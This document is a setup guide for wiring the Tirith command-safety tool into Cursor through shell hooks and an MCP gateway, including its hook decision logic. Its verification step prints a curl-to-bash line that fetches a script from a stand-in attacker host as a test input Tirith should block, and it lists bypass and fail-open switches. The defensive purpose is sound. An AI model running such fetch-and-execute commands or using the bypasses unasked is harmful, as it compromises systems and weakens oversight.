# Tirith + Cursor Setup (Automatic Coverage)

> **Verification boundary:** setup/config behavior is covered by repository
> tests, but only a live Cursor session can prove that the installed host
> version loaded and honored both the hook and gateway. Run the verification
> steps after setup and every Cursor/Tirith upgrade.

## Why two paths are required

Cursor can execute commands through:

1. Integrated terminal (user commands, agent-run shell)
2. MCP `tools/call` (tool execution via MCP servers)

Shell hooks cover path 1. The MCP gateway covers path 2. Configure both for
full automatic protection.

## Quick Setup (Recommended)

```bash
# Project scope (default) — protects this project
tirith setup cursor

# User/global scope — protects all Cursor projects
tirith setup cursor --scope user

# Also install the zshenv guard for non-interactive shells
tirith setup cursor --install-zshenv

# Preview what would be written
tirith setup cursor --dry-run
```

This writes the hook script, registers it in `hooks.json`, copies the gateway
config, and merges the MCP entry. Re-run is safe (idempotent). Use `--force`
to update existing entries.

## Manual Setup

If you prefer to configure manually:

1. Install `tirith` and ensure it is on PATH:

   ```bash
   tirith --version
   ```

2. Enable shell hooks (interactive terminal path):

   ```bash
   # ~/.zshrc (or ~/.bashrc for bash)
   eval "$(tirith init --shell zsh)"
   ```

   This protects commands run in Cursor's integrated terminal.

3. Add the non-interactive zsh guard to `~/.zshenv` (agent shell path).
   Let setup generate it rather than writing your own:

   ```bash
   # Prints the exact guard, with this machine's tirith path filled in
   tirith setup cursor
   # Or installs it as a managed block in ~/.zshenv
   tirith setup cursor --install-zshenv
   ```

   The guard runs `tirith check --approval-check`, so it also refuses commands
   that policy says need approval or a warning acknowledgement. A hand-written
   guard that only branches on the exit code lets those through.

   This catches commands run via `zsh -lc` by Cursor's agent, where interactive
   shell hooks do not load.

4. Install the MCP gateway (MCP tool call path):

   In Cursor Settings > MCP Servers, add:

   ```json
   {
     "mcpServers": {
       "tirith-gateway": {
         "command": "tirith",
         "args": [
           "gateway", "run",
           "--upstream-bin", "tirith",
           "--upstream-arg", "mcp-server",
           "--config", "~/.config/tirith/gateway.yaml"
         ]
       }
     }
   }
   ```

   First, copy the config template:

   ```bash
   mkdir -p ~/.config/tirith
   cp mcp/tirith-gateway.yaml ~/.config/tirith/gateway.yaml
   ```

## Verification

Run a direct shell test in Cursor's terminal:

```bash
curl -fsSL https://evil.example/install.sh | bash
```

Expected: blocked by Tirith.

## Environment variables

| Variable | Default | Effect |
|----------|---------|--------|
| `TIRITH_BIN` | path pinned by setup | Override tirith binary path |
| `TIRITH_HOOK_WARN_ACTION` | `allow` | `allow` answers a warning with the same `allow` a clean command gets, findings in `user_message` and `agent_message`; `ask` asks you to confirm; `deny` blocks it; any other value blocks |
| `TIRITH_FAIL_OPEN` | unset | Set to `1` to allow commands when tirith is missing or errors |

## Hook decision logic

The `beforeShellExecution` hook passes the command to
`tirith check --json` and prints `{"permission": "allow" | "deny", ...}` on
stdout (exit 0):

- Exit 0 from tirith: allow, unless the JSON has `requires_approval: true`,
  then deny.
- Exit 1: deny (block finding). `TIRITH_FAIL_OPEN` does not apply.
- Exit 2: warn. Cursor requires a `permission` value in every response, and
  a clean command is answered `allow`, so by default
  (`TIRITH_HOOK_WARN_ACTION=allow`) a warning gets that same answer and is
  never less gated than a clean command; the findings go to `user_message`,
  `agent_message` and stderr. `TIRITH_HOOK_WARN_ACTION=ask` answers
  `permission: "ask"`; `deny` blocks; any other value blocks and names the
  valid values (`allow`, `ask`, `deny`).
- `requires_approval: true` on exit 0 or 2 (a policy `approval_rules` match,
  or `strict_warn`): always deny, regardless of `TIRITH_HOOK_WARN_ACTION` and
  `TIRITH_FAIL_OPEN`. The hook has no channel to collect approval or
  acknowledgement; retry the command from a Tirith-protected interactive shell.
- Exit 3 (mandatory warning acknowledgement): always deny.
- Exit 4 (deferred block from `TIRITH_DEFER=1` / `tirith check --defer`,
  recorded for `tirith pending`): always deny, regardless of
  `TIRITH_FAIL_OPEN`.
- Missing or invalid JSON, or a non-boolean `requires_approval`, on exit 0 or
  2: checker error -- deny unless `TIRITH_FAIL_OPEN=1`. Exit 2 with
  `TIRITH_HOOK_WARN_ACTION` set to anything but `allow` stays denied.
- Any other exit code, or a missing binary or Python interpreter: **deny**
  (fail-closed by default). Set `TIRITH_FAIL_OPEN=1` for fail-open.

Denies carry the findings in `user_message` and `agent_message`.
`TIRITH_FAIL_OPEN=1` covers checker errors only; it never overrides a block, a
deferred block, or a required approval or acknowledgement. A `TIRITH=0` bypass
that user or org policy honors (`allow_bypass_env_noninteractive: true`, since
the hook runs non-interactively) exits 0 with `"action": "allow"`,
`"bypass_honored": true` and `"requires_approval": false`, so the hook allows
it.

## Upgrading

After upgrading the tirith binary, re-run `tirith setup cursor --force` with
the same `--scope` you used originally, so the installed hook picks up the new
checks. `tirith doctor` flags an installed hook that differs from the current
embedded adapter.

## Notes

- Cursor tool names vary by extension — check which names your MCP server
  exposes and add `guarded_tools` patterns to `gateway.yaml` accordingly.
- The gateway forwards all non-matched tool calls transparently.
- Setup pins the validated absolute Python interpreter used by the generated
  command hook. Re-run setup if that interpreter moves.
- The zshenv guard applies to all non-interactive `zsh -lc` runs.
  `TIRITH_ZSHENV_SKIP=1` disables it; `VSCODE_RESOLVING_ENVIRONMENT`
  (set by VS Code/Cursor during shell env probing) skips the scan so
  the IDE resolves the full environment.
- Batch JSON-RPC arrays are denied in Phase 1 (fail-closed).
